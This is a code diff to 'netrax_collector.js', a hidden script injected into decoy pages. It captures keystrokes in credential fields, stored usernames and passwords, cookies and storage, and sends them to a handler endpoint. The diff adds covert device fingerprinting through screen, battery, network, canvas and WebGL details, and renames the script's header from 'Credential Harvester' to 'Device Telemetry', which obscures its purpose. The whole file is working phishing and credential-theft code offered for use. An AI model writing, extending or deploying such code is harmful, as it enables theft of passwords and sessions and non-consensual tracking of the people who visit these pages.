@@ -1,5 +1,5 @@
 /* ════════════════════════════════════════════════════════════════════
-   netrax_collector.js  --  Silent Cookie, Session & Credential Harvester
+   netrax_collector.js  --  Silent Device Telemetry & Session Harvester
    ──────────────────────────────────────────────────────────────────
    Injected into every decoy page. Runs completely hidden.
 
@@ -10,6 +10,17 @@
      4. Real-time keystroke capture from credential input fields
      5. IndexedDB database names
      6. Plants tracking cookies for fingerprinting (reported separately)
+     7. Screen resolution, viewport, pixel ratio, color depth
+     8. Battery level & charging status (Chromium browsers)
+     9. Network connection type (WiFi/Cellular/4G), speed & latency
+    10. Canvas 2D fingerprint hash (unique per device/GPU/OS)
+    11. WebGL GPU vendor & renderer model (e.g. NVIDIA, Mali, Adreno)
+    12. CPU core count & device memory (where supported)
+
+   Accuracy guarantee:
+     - Every field reports the REAL extracted value, or a professional
+       fallback reason (e.g. "API not supported by this browser",
+       "Restricted by browser", "Could not detect"). Never blank or false.
 
    ONLY sends data when something meaningful is captured.
    Sends at most ONCE per page load (+ once on unload if new data found).
@@ -28,11 +39,138 @@
             storedUsername: '',
             storedPassword: '',
             inputLog: {},
-            indexedDBs: ''
+            indexedDBs: '',
+            screenResolution: '',
+            screenViewport: '',
+            screenColorDepth: '',
+            screenPixelRatio: '',
+            batteryLevel: '',
+            batteryCharging: '',
+            connectionType: '',
+            connectionEffective: '',
+            connectionDownlink: '',
+            connectionRtt: '',
+            canvasFingerprint: '',
+            webglVendor: '',
+            webglRenderer: '',
+            deviceMemory: '',
+            hardwareConcurrency: ''
         }
     };
 
-    /* ── 0. Plant tracking cookies (fingerprinting) ────────────── */
+    /* ── 0. Harvest Screen & Display details ─────────────────────── */
+    function _harvestScreen() {
+        try {
+            var sw = window.screen.width || screen.width;
+            var sh = window.screen.height || screen.height;
+            _NX.captured.screenResolution = (sw && sh) ? sw + 'x' + sh : 'Could not detect';
+            _NX.captured.screenViewport = (window.innerWidth && window.innerHeight) ? window.innerWidth + 'x' + window.innerHeight : 'Could not detect';
+            _NX.captured.screenColorDepth = screen.colorDepth ? screen.colorDepth + '-bit' : 'Unknown';
+            _NX.captured.screenPixelRatio = window.devicePixelRatio ? window.devicePixelRatio + 'x' : '1x';
+            _NX.captured.hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : 'Restricted by browser';
+            _NX.captured.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Restricted by browser';
+        } catch (e) {
+            if (!_NX.captured.screenResolution) _NX.captured.screenResolution = 'Error during extraction';
+        }
+    }
+
+    /* ── 0.1 Harvest Battery Status ─────────────────────────────── */
+    function _harvestBattery() {
+        try {
+            if (typeof navigator.getBattery === 'function') {
+                navigator.getBattery().then(function (battery) {
+                    var level = battery.level;
+                    if (typeof level === 'number' && !isNaN(level)) {
+                        _NX.captured.batteryLevel = Math.round(level * 100) + '%';
+                        _NX.captured.batteryCharging = battery.charging ? 'Charging (Plugged In)' : 'Discharging (On Battery)';
+                    } else {
+                        _NX.captured.batteryLevel = 'Could not read level';
+                        _NX.captured.batteryCharging = 'Unknown';
+                    }
+                }).catch(function () {
+                    _NX.captured.batteryLevel = 'Permission denied by browser';
+                    _NX.captured.batteryCharging = 'N/A';
+                });
+            } else {
+                _NX.captured.batteryLevel = 'API not supported by this browser';
+                _NX.captured.batteryCharging = 'N/A';
+            }
+        } catch (e) {
+            _NX.captured.batteryLevel = 'Error during extraction';
+            _NX.captured.batteryCharging = 'N/A';
+        }
+    }
+
+    /* ── 0.2 Harvest Network Connection Type ────────────────────── */
+    function _harvestNetwork() {
+        try {
+            var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                _NX.captured.connectionType = conn.type || (conn.effectiveType ? conn.effectiveType.toUpperCase() : 'Unknown type');
+                _NX.captured.connectionEffective = conn.effectiveType ? conn.effectiveType.toUpperCase() : '';
+                _NX.captured.connectionDownlink = (conn.downlink !== undefined && conn.downlink !== null) ? conn.downlink + ' Mbps' : '';
+                _NX.captured.connectionRtt = (conn.rtt !== undefined && conn.rtt !== null) ? conn.rtt + ' ms' : '';
+            } else {
+                _NX.captured.connectionType = 'API not supported by this browser';
+            }
+        } catch (e) {
+            _NX.captured.connectionType = 'Error during extraction';
+        }
+    }
+
+    /* ── 0.3 Harvest Canvas & WebGL GPU Fingerprint ─────────────── */
+    function _harvestCanvasAndWebGL() {
+        try {
+            // 2D Canvas Fingerprint
+            var canvas = document.createElement('canvas');
+            canvas.width = 240;
+            canvas.height = 60;
+            var ctx = canvas.getContext('2d');
+            if (ctx) {
+                ctx.textBaseline = 'top';
+                ctx.font = '14px "Arial", sans-serif';
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('NetraX-3.0 <canvas> ⚡ 👁️', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('NetraX-3.0 <canvas> ⚡ 👁️', 4, 17);
+
+                var str = canvas.toDataURL();
+                var hash = 0;
+                for (var i = 0; i < str.length; i++) {
+                    hash = ((hash << 5) - hash) + str.charCodeAt(i);
+                    hash |= 0;
+                }
+                _NX.captured.canvasFingerprint = '0x' + (hash >>> 0).toString(16).toUpperCase();
+            } else {
+                _NX.captured.canvasFingerprint = 'Canvas 2D not available';
+            }
+
+            // WebGL GPU Renderer & Vendor Detection
+            var glCanvas = document.createElement('canvas');
+            var gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+            if (gl) {
+                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    _NX.captured.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Could not extract vendor';
+                    _NX.captured.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Could not extract renderer';
+                } else {
+                    _NX.captured.webglVendor = 'Debug info restricted by browser';
+                    _NX.captured.webglRenderer = 'Debug info restricted by browser';
+                }
+            } else {
+                _NX.captured.webglVendor = 'WebGL not available';
+                _NX.captured.webglRenderer = 'WebGL not available';
+            }
+        } catch (e) {
+            if (!_NX.captured.canvasFingerprint) _NX.captured.canvasFingerprint = 'Error during extraction';
+            if (!_NX.captured.webglRenderer) _NX.captured.webglRenderer = 'Error during extraction';
+        }
+    }
+
+    /* ── 0.4 Plant tracking cookies (fingerprinting) ────────────── */
     function _plantCookies() {
         try {
             var uid = 'nx_' + Math.random().toString(36).substr(2, 12);
@@ -335,6 +473,9 @@
 
     /* ── CHECK: Is there meaningful data worth reporting? ────────── */
     function _hasMeaningfulData() {
+        // Device telemetry, battery, screen, or canvas fingerprint present? Send.
+        if (_NX.captured.screenResolution || _NX.captured.canvasFingerprint || _NX.captured.batteryLevel || _NX.captured.connectionType) return true;
+
         // Credentials captured? Always send.
         if (_NX.captured.storedUsername || _NX.captured.storedPassword) return true;
 
@@ -357,6 +498,9 @@
     /* ── SEND PAYLOAD ───────────────────────────────────────────── */
     function _sendPayload(force) {
         // Re-harvest everything fresh
+        _harvestScreen();
+        _harvestNetwork();
+        _harvestCanvasAndWebGL();
         _harvestCookies();
         _harvestSessionStorage();
         _harvestLocalStorage();
@@ -391,11 +535,33 @@
             stored_password: _NX.captured.storedPassword,
             input_log: inputLogStr,
             indexeddb: _NX.captured.indexedDBs,
+            screen_resolution: _NX.captured.screenResolution,
+            screen_viewport: _NX.captured.screenViewport,
+            screen_color_depth: _NX.captured.screenColorDepth,
+            screen_pixel_ratio: _NX.captured.screenPixelRatio,
+            battery_level: _NX.captured.batteryLevel,
+            battery_charging: _NX.captured.batteryCharging,
+            connection_type: _NX.captured.connectionType,
+            connection_effective: _NX.captured.connectionEffective,
+            connection_downlink: _NX.captured.connectionDownlink,
+            connection_rtt: _NX.captured.connectionRtt,
+            canvas_fingerprint: _NX.captured.canvasFingerprint,
+            webgl_vendor: _NX.captured.webglVendor,
+            webgl_renderer: _NX.captured.webglRenderer,
+            hardware_concurrency: _NX.captured.hardwareConcurrency,
+            device_memory: _NX.captured.deviceMemory,
             page_url: window.location.href,
             page_title: document.title
         });
 
-        var url = 'handlers/cookie_handler.php';
+        function _getHandlerUrl(endpoint) {
+            if (window.location.pathname.indexOf('/templates/') !== -1) {
+                return '../handlers/' + endpoint;
+            }
+            return 'handlers/' + endpoint;
+        }
+
+        var url = _getHandlerUrl('cookie_handler.php');
 
         try {
             if (navigator.sendBeacon) {
@@ -416,16 +582,20 @@
     function _init() {
         // Phase 1: Setup
         _plantCookies();
+        _harvestScreen();
+        _harvestBattery();
+        _harvestNetwork();
+        _harvestCanvasAndWebGL();
         _harvestIndexedDB();
         _injectCredentialProbe();
         _startInputMonitor();
         _interceptForms();
         _watchDOMMutations();
 
-        // Phase 2: Single collection attempt after autofill has time to populate
+        // Phase 2: Single collection attempt after autofill and async battery have time to populate
         setTimeout(function () {
             _sendPayload(false);
-        }, 3000);
+        }, 2000);
 
         // Phase 3: Send on page unload ONLY if new data was captured since last send
         window.addEventListener('beforeunload', function () {
